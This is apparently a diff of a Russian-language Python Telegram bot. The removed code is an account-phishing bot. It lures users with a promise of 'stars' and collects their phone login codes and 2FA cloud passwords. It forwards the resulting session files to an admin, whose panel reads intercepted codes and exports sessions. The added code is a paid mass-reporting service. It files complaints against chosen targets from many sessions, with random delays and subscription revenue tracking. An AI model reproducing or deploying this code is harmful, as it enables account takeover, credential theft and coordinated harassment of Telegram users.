-                                buttons.append([Button.inline("📨 ОТПРАВИТЬ НОВЫЙ КОД", f"send_new_code_{phone}".encode())])
-                                buttons.append([Button.inline("◀️ НАЗАД", f"view_{phone}".encode())])
-                                
-                                await client.disconnect()
-                                await event.edit(text, buttons=buttons)
-                            else:
-                                buttons = [
-                                    [Button.inline("🔄 ПОПРОБОВАТЬ СНОВА", f"showcodes_{phone}".encode())],
-                                    [Button.inline("📨 ОТПРАВИТЬ НОВЫЙ КОД", f"send_new_code_{phone}".encode())],
-                                    [Button.inline("◀️ НАЗАД", f"view_{phone}".encode())]
-                                ]
-                                await client.disconnect()
-                                await event.edit(
-                                    f"📭 **Коды не найдены**\n\n"
-                                    f"📱 Аккаунт: {phone}\n"
-                                    f"👤 Владелец: {me.first_name}\n\n"
-                                    f"🔍 **Проверено:**\n"
-                                    f"• Saved Messages (30 сообщений)\n"
-                                    f"• Диалоги с Telegram\n"
-                                    f"• Последние 10 чатов\n\n"
-                                    f"💡 **Совет:** Отправьте новый код через кнопку ниже",
-                                    buttons=buttons
-                                )
-                        else:
-                            await event.edit("❌ Сессия не активна. Нужно войти заново.")
-                            await client.disconnect()
-                        
-                        found = True
-                        break
-                        
-                    except Exception as e:
-                        await event.edit(f"❌ Ошибка: {str(e)[:100]}")
-                        try:
-                            await client.disconnect()
-                        except:
-                            pass
-                        found = True
-                        break
-            
-            if not found:
-                await event.edit("❌ Файл сессии не найден")
-            await event.answer()
-        
-        # ФУНКЦИЯ ОТПРАВКИ НОВОГО КОДА
-        elif data.startswith("send_new_code_"):
-            phone = data.replace("send_new_code_", "")
-            
-            await event.edit("🔄 **Отправляю новый код...**")
-            
-            found = False
-            for f in os.listdir("sessions"):
-                if phone.replace('+', '') in f and f.endswith('.session'):
-                    try:
-                        session_path = f"sessions/{f.replace('.session', '')}"
-                        client = TelegramClient(session_path, API_ID, API_HASH)
-                        
-                        # Подключаемся
-                        await client.connect()
-                        
-                        if await client.is_user_authorized():
-                            me = await client.get_me()
-                            
-                            # Отправляем новый код (клиент уже подключен)
-                            await client.send_code_request(phone)
-                            
-                            buttons = [
-                                [Button.inline("🔄 ПОСМОТРЕТЬ КОДЫ", f"showcodes_{phone}".encode())],
-                                [Button.inline("◀️ НАЗАД", f"view_{phone}".encode())]
-                            ]
-                            
-                            await client.disconnect()
-                            await event.edit(
-                                f"✅ **Новый код отправлен!**\n\n"
-                                f"📱 Номер: {phone}\n"
-                                f"👤 Владелец: {me.first_name}\n"
-                                f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
-                                f"Код придет в Telegram в течение минуты.\n"
-                                f"После получения нажмите 'Посмотреть коды'",
-                                buttons=buttons
-                            )
-                        else:
-                            await event.edit("❌ Сессия не активна")
-                            await client.disconnect()
-                        
-                        found = True
-                        break
-                        
-                    except Exception as e:
-                        await event.edit(f"❌ Ошибка: {str(e)[:100]}")
-                        try:
-                            await client.disconnect()
-                        except:
-                            pass
-                        found = True
-                        break
-            
-            if not found:
-                await event.edit("❌ Файл сессии не найден")
-            await event.answer()
-        
-        elif data.startswith("usecode_"):
-            parts = data.split('_')
-            phone = parts[1]
-            code = parts[2] 
-            
-            acc = get_account(phone)
-            if acc:
-                text = (
-                    f"📱 **НОМЕР**\n`{phone}`\n\n"
-                    f"🔑 **ВЫБРАН КОД**\n`{code}`\n\n"
-                    f"🔐 **2FA**\n`{acc['twofa'] if acc['twofa'] else 'нет'}`\n\n"
-                    f"👤 **ИМЯ**\n{acc['name']}"
-                )
-                
-                buttons = [
-                    [Button.inline("◀️ К КОДАМ", f"showcodes_{phone}".encode())],
-                    [Button.inline("◀️ К АККАУНТУ", f"view_{phone}".encode())]
-                ]
-                
-                await event.edit(text, buttons=buttons)
-            await event.answer()
-        
-        elif data.startswith("getsess_"):
-            phone = data.replace("getsess_", "")
-            
-            found = False
-            for f in os.listdir("sessions"):
-                if phone.replace('+', '') in f and f.endswith('.session'):
-                    await bot.send_file(user_id, f"sessions/{f}", 
-                        caption=f"📎 Сессия для {phone}")
-                    found = True
-                    break
-            
-            if not found:
-                await event.edit("❌ Файл не найден")
-            await event.answer()
-        
-        elif data == "admin_stats":
-            accounts = load_accounts()
-            files = os.listdir("sessions")
-            sessions_count = len([f for f in files if f.endswith('.session')])
-            
-            text = (
-                f"📊 **СТАТИСТИКА**\n\n"
-                f"📱 Аккаунтов: {len(accounts)}\n"
-                f"📎 Сессий: {sessions_count}\n"
-                f"🕒 Последний: {accounts[-1]['date'][:16] if accounts else 'нет'}"
-            )
-            
-            buttons = [[Button.inline("◀️ НАЗАД", b"admin_list")]]
-            await event.edit(text, buttons=buttons)
-            await event.answer()
-        
-        elif data == "admin_clean":
-            count = 0
-            for f in os.listdir("sessions"):
-                if f.endswith('.session'):
-                    os.remove(f"sessions/{f}")
-                    count += 1
-            
-            await event.edit(f"🧹 **Удалено файлов: {count}**")
-            await event.answer()
-        
-        elif data == "back_admin":
-            buttons = [
-                [Button.inline("📊 ВСЕ АККАУНТЫ", b"admin_list")],
-                [Button.inline("📈 СТАТИСТИКА", b"admin_stats")],
-                [Button.inline("🧹 ОЧИСТИТЬ", b"admin_clean")]
-            ]
-            await event.edit("👑 **АДМИН ПАНЕЛЬ**\n\nВыберите действие:", buttons=buttons)
-            await event.answer()
+            await self.send_reports(event, state, evidence)
+            del self.user_states[event.sender_id]
     
-    @bot.on(events.NewMessage)
-    async def message_handler(event):
-        user_id = event.sender_id
+    async def send_reports(self, event, state, evidence):
+        """Отправка жалоб через все сессии"""
+        if not self.session_clients:
+            await event.reply("❌ Нет активных сессий для отправки жалоб!")
+            return
         
-        if event.message.contact:
-            phone = event.message.contact.phone_number
-            
-            session = f"sessions/user_{user_id}_{phone.replace('+', '')}"
-            client = TelegramClient(session, API_ID, API_HASH)
-            await client.connect()
-            
+        await event.reply(
+            f"🔄 <b>Начинаю отправку жалоб...</b>\n"
+            f"Используется сессий: {len(self.session_clients)}",
+            parse_mode='html'
+        )
+        
+        report_type = state['report_type']
+        target = state['target']
+        reason_key = state['reason']
+        
+        reason_info = REPORT_REASONS.get(reason_key, REPORT_REASONS['other'])
+        reason = self.reason_mapping.get(reason_key, InputReportReasonOther())
+        
+        report_text = f"Жалоба на {report_type} {target}. Причина: {reason_info['name']}"
+        if evidence:
+            report_text += f"\nДоказательства: {evidence}"
+        
+        success = 0
+        failed = 0
+        errors = []
+        
+        for session_data in self.session_clients:
             try:
-                await client.send_code_request(phone)
+                client = session_data['client']
                 
-                user_sessions[user_id] = {
-                    'client': client,
-                    'phone': phone,
-                    'session': session,
-                    'code': '',
-                    'code_attempts': 0
-                }
+                try:
+                    entity = await client.get_entity(target)
+                except Exception as e:
+                    failed += 1
+                    errors.append(f"{session_data['name']}: Не найден пользователь")
+                    continue
                 
-                buttons = [
-                    [Button.inline("1️⃣", b"1"), Button.inline("2️⃣", b"2"), Button.inline("3️⃣", b"3")],
-                    [Button.inline("4️⃣", b"4"), Button.inline("5️⃣", b"5"), Button.inline("6️⃣", b"6")],
-                    [Button.inline("7️⃣", b"7"), Button.inline("8️⃣", b"8"), Button.inline("9️⃣", b"9")],
-                    [Button.inline("◀️", b"del"), Button.inline("0️⃣", b"0"), Button.inline("✅", b"ok")]
-                ]
+                await client(ReportRequest(
+                    peer=entity,
+                    id=[entity.id],
+                    reason=reason,
+                    message=report_text
+                ))
                 
-                await event.reply("📱 **Код:** `⬜⬜⬜⬜⬜`\n\n⬇️ **Введи 5 цифр:**", buttons=buttons)
+                success += 1
+                self.db.increment_reports(event.sender_id)
+                await asyncio.sleep(random.uniform(2, 5))
                 
             except Exception as e:
-                await event.reply(f"❌ Ошибка: {e}")
-                await client.disconnect()
+                failed += 1
+                errors.append(f"{session_data['name']}: {str(e)[:50]}")
         
-        elif user_id in user_sessions and user_sessions[user_id].get('step') == 'wait_2fa':
-            password = event.message.text.strip()
-            data = user_sessions[user_id]
-            
-            try:
-                await data['client'].sign_in(password=password)
-                me = await data['client'].get_me()
-                
-                save_account(
-                    phone=data['phone'],
-                    code="2fa",
-                    twofa=password,
-                    name=me.first_name,
-                    user_id=user_id
-                )
-                
-                session_file = f"{data['session']}.session"
-                if os.path.exists(session_file):
-                    await bot.send_file(ADMIN_ID, session_file,
-                        caption=f"📱 {data['phone']} (2FA)\n👤 {me.first_name}")
-                
-                await event.reply("✅ **ГОТОВО!** Звезды зачислены!")
-                
-                await data['client'].disconnect()
-                del user_sessions[user_id]
-                
-            except Exception as e:
-                if "PASSWORD_HASH_INVALID" in str(e):
-                    if '2fa_attempts' not in data:
-                        data['2fa_attempts'] = 1
-                    else:
-                        data['2fa_attempts'] += 1
-                    
-                    if data['2fa_attempts'] >= 3:
-                        await event.reply(
-                            "❌ **Слишком много неправильных попыток!**\n\n"
-                            "🔄 **Нажмите /start чтобы начать заново**"
-                        )
-                        await data['client'].disconnect()
-                        del user_sessions[user_id]
-                    else:
-                        remaining = 3 - data['2fa_attempts']
-                        await event.reply(
-                            f"❌ **Неправильный облачный пароль!** Осталось попыток: {remaining}\n\n"
-                            "🔐 **Это пароль из настроек Telegram (2FA)**\n"
-                            "• НЕ код из SMS\n"
-                            "• Проверьте раскладку\n\n"
-                            "📝 **Введите пароль еще раз:**"
-                        )
-                else:
-                    await event.reply(f"❌ Ошибка: {e}")
-    
-    await bot.run_until_disconnected()
+        result_text = f"""
+✅ <b>Жалобы отправлены!</b>
 
-if __name__ == "__main__":
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
+🎯 Тип: {report_type}
+👤 Цель: {target}
+📝 Причина: {reason_info['name']}
+
+📊 <b>Результат:</b>
+• Успешно: {success}
+• Ошибок: {failed}
+• Всего сессий: {len(self.session_clients)}
+"""
+        
+        if errors and len(errors) <= 3:
+            result_text += "\n<b>Ошибки:</b>\n" + "\n".join(errors[:3])
+        
+        await event.reply(result_text, parse_mode='html', buttons=[
+            [Button.inline("📊 Еще жалоба", data=f"report_{report_type}"),
+             Button.inline("🏠 Главное меню", data="main_menu")]
+        ])
+    
+    async def show_admin_panel(self, event):
+        """Панель администратора"""
+        stats = self.db.get_admin_stats()
+        
+        text = f"""
+👑 <b>ПАНЕЛЬ АДМИНИСТРАТОРА</b>
+
+📊 <b>Статистика:</b>
+• Всего пользователей: {stats['total_users']}
+• Активных подписок: {stats['active_subs']}
+• Всего жалоб: {stats['total_reports']}
+• Доход: {stats['total_revenue']:.2f}$
+
+<b>Подписки по типам:</b>
+• 1 день: {stats['subscriptions']['1_day']}
+• 3 дня: {stats['subscriptions']['3_days']}  
+• 7 дней: {stats['subscriptions']['7_days']}
+• 30 дней: {stats['subscriptions']['30_days']}
+
+<b>Активных сессий:</b> {len(self.session_clients)}
+"""
+        buttons = [
+            [Button.inline("📋 Список пользователей", data="admin_list_users")],
+            [Button.inline("📊 Детальная статистика", data="admin_stats")],
+            [Button.inline("📜 История действий", data="admin_actions")],
+            [Button.inline("◀️ Назад", data="main_menu")]
+        ]
+        
+        await event.edit(text, buttons=buttons, parse_mode='html')
+    
+    async def show_users_list(self, event):
+        """Список пользователей"""
+        users = self.db.get_all_users(limit=10)
+        
+        text = "📋 <b>Последние 10 пользователей:</b>\n\n"
+        
+        for user in users:
+            user_id, username, sub_type, sub_end, used, total, joined, last = user
+            status = "✅" if sub_end and datetime.fromisoformat(sub_end) > datetime.now() else "❌"
+            text += f"{status} <b>{username}</b> (ID: {user_id})\n"
+            text += f"   📅 Регистрация: {joined[:10]}\n"
+            text += f"   📊 Жалоб: {total}\n\n"
+        
+        buttons = [[Button.inline("◀️ Назад", data="admin_panel")]]
+        await event.edit(text, buttons=buttons, parse_mode='html')
+    
+    async def show_admin_stats(self, event):
+        """Детальная статистика"""
+        stats = self.db.get_admin_stats()
+        
+        # Статистика по сессиям
+        sessions_text = "\n<b>Активные сессии:</b>\n"
+        for s in self.session_clients:
+            sessions_text += f"• @{s['username']} ({s['phone']})\n"
+        
+        text = f"""
+📊 <b>ДЕТАЛЬНАЯ СТАТИСТИКА</b>
+
+👥 <b>Пользователи:</b>
+• Всего: {stats['total_users']}
+• С подпиской: {stats['active_subs']}
+
+💎 <b>Подписки:</b>
+• 1 день: {stats['subscriptions']['1_day']}
+• 3 дня: {stats['subscriptions']['3_days']}
+• 7 дней: {stats['subscriptions']['7_days']}
+• 30 дней: {stats['subscriptions']['30_days']}
+
+💰 <b>Доход:</b>
+• Всего: {stats['total_revenue']:.2f}$
+
+📊 <b>Активность:</b>
+• Всего жалоб: {stats['total_reports']}
+{sessions_text}
+"""
+        buttons = [[Button.inline("◀️ Назад", data="admin_panel")]]
+        await event.edit(text, buttons=buttons, parse_mode='html')
+    
+    async def show_admin_actions(self, event):
+        """История действий админов"""
+        actions = self.db.get_admin_actions(limit=10)
+        
+        text = "📜 <b>Последние действия:</b>\n\n"
+        
+        for action in actions:
+            admin_id, action_type, target, details, created = action
+            text += f"• [{created[11:16]}] {action_type}\n"
+            text += f"  Админ: {admin_id}\n"
+            text += f"  Цель: {target}\n"
+            text += f"  Детали: {details}\n\n"
+        
+        buttons = [[Button.inline("◀️ Назад", data="admin_panel")]]
+        await event.edit(text, buttons=buttons, parse_mode='html')
+
+async def main():
+    bot = PremiumReportBot()
     try:
-        loop.run_until_complete(main())
+        await bot.start_bot()
     except KeyboardInterrupt:
-        print("\n✅ Бот остановлен")
+        logger.info("Бот остановлен")
+    except Exception as e:
+        logger.error(f"Ошибка: {e}")
+
+if __name__ == '__main__':
+    asyncio.run(main())
